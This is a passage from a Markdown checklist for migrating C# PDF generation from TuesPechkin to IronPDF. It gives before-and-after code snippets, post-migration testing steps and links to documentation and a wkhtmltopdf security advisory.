  IronPdf.License.LicenseKey = "YOUR-LICENSE-KEY";
  ```
  **Why:** License key must be set before any PDF operations.

- [ ] **Replace converters with `ChromePdfRenderer`**
  ```csharp
  // Before (TuesPechkin)
  var converter = new ThreadSafeConverter(new RemotingToolset<PechkinBindings>());

  // After (IronPDF)
  var renderer = new ChromePdfRenderer();
  ```
  **Why:** IronPDF uses ChromePdfRenderer for modern rendering capabilities.

- [ ] **Convert GlobalSettings to RenderingOptions**
  ```csharp
  // Before (TuesPechkin)
  var globalSettings = new GlobalSettings { PaperSize = PaperKind.A4 };

  // After (IronPDF)
  renderer.RenderingOptions.PaperSize = PdfPaperSize.A4;
  ```
  **Why:** RenderingOptions provides a unified configuration approach.

- [ ] **Convert ObjectSettings to method parameters**
  ```csharp
  // Before (TuesPechkin)
  var objectSettings = new ObjectSettings { HtmlContent = "<html>...</html>" };

  // After (IronPDF)
  var pdf = renderer.RenderHtmlAsPdf("<html>...</html>");
  ```
  **Why:** IronPDF simplifies settings by using method parameters directly.

- [ ] **Update margin configuration**
  ```csharp
  // Before (TuesPechkin)
  globalSettings.MarginTop = "10mm";

  // After (IronPDF)
  renderer.RenderingOptions.MarginTop = 10;
  ```
  **Why:** Ensure consistent margin settings with IronPDF's options.

- [ ] **Update header/footer syntax**
  ```csharp
  // Before (TuesPechkin)
  objectSettings.HeaderSettings = new HeaderSettings { Content = "Header text" };

  // After (IronPDF)
  renderer.RenderingOptions.HtmlHeader = new HtmlHeaderFooter()
  {
      HtmlFragment = "<div>Header text</div>",
      MaxHeight = 25
  };
  ```
  **Why:** IronPDF uses HTML with placeholders for flexible header/footer content.

- [ ] **Fix page placeholder syntax (`[page]` → `{page}`)**
  ```csharp
  // Before (TuesPechkin)
  "Page [page] of [toPage]"

  // After (IronPDF)
  "Page {page} of {total-pages}"
  ```
  **Why:** Update to IronPDF's placeholder syntax for accurate pagination.

- [ ] **Remove deployment/toolset code**
  ```csharp
  // Before (TuesPechkin)
  var toolset = new RemotingToolset<PechkinBindings>();

  // After (IronPDF)
  // No equivalent needed
  ```
  **Why:** IronPDF does not require separate deployment toolsets.

### Post-Migration

- [ ] **Run all unit tests**
  **Why:** Verify all PDF generation still works correctly after migration.

- [ ] **Test thread-safe scenarios**
  **Why:** Ensure IronPDF handles multi-threading without issues.

- [ ] **Compare PDF output quality**
  **Why:** IronPDF's Chromium engine may render slightly differently. Usually better, but verify key documents.

- [ ] **Verify CSS rendering (Flexbox/Grid)**
  **Why:** Ensure modern CSS features are rendered correctly with IronPDF.

- [ ] **Test JavaScript execution**
  **Why:** Dynamic content should now render more reliably with modern Chromium.

- [ ] **Test header/footer rendering**
  **Why:** Ensure headers and footers appear as expected with new HTML-based configuration.

- [ ] **Performance test batch operations**
  **Why:** Validate IronPDF's performance under load compared to the previous solution.

- [ ] **Security scan (verify no wkhtmltopdf)**
  **Why:** Ensure no legacy binaries remain that could pose security risks.

- [ ] **Update CI/CD pipelines**
  **Why:** Ensure continuous integration and deployment processes reflect the new library usage.

- [ ] **Update Docker configurations**
  **Why:** Ensure Docker images are configured for IronPDF, removing any wkhtmltopdf dependencies.

- [ ] **Remove wkhtmltopdf from CI/CD**
  **Why:** Eliminate outdated binaries to prevent security vulnerabilities.

- [ ] **Update documentation**
  **Why:** Ensure all project documentation reflects the migration to IronPDF.
---

## Additional Resources

### IronPDF Documentation
- **Getting Started**: https://ironpdf.com/docs/
- **API Reference**: https://ironpdf.com/object-reference/api/
- **Tutorials**: https://ironpdf.com/tutorials/
- **HTML to PDF**: https://ironpdf.com/how-to/html-file-to-pdf/

### Security Resources
- **CVE-2022-35583**: https://nvd.nist.gov/vuln/detail/CVE-2022-35583
- **wkhtmltopdf Status**: https://wkhtmltopdf.org/status.html

### Related Migration Guides
- **[Migrate from TuesPechkin to IronPDF](https://ironpdf.com/blog/migration-guides/migrate-from-tuespechkin-to-ironpdf/)** — Comprehensive migration documentation
- **[wkhtmltopdf Migration](../wkhtmltopdf/migrate-from-wkhtmltopdf.md)** — Parent technology
- **[DinkToPdf Migration](../dinktopdf/migrate-from-dinktopdf.md)** — Similar wrapper
- **[Rotativa Migration](../rotativa/migrate-from-rotativa.md)** — ASP.NET wrapper

### Support
- **IronPDF Support**: https://ironpdf.com/support/
- **License Information**: https://ironpdf.com/licensing/

---

*This migration guide is part of the [Awesome .NET PDF Libraries 2025](../README.md) collection — 73 C#/.NET PDF libraries compared.*
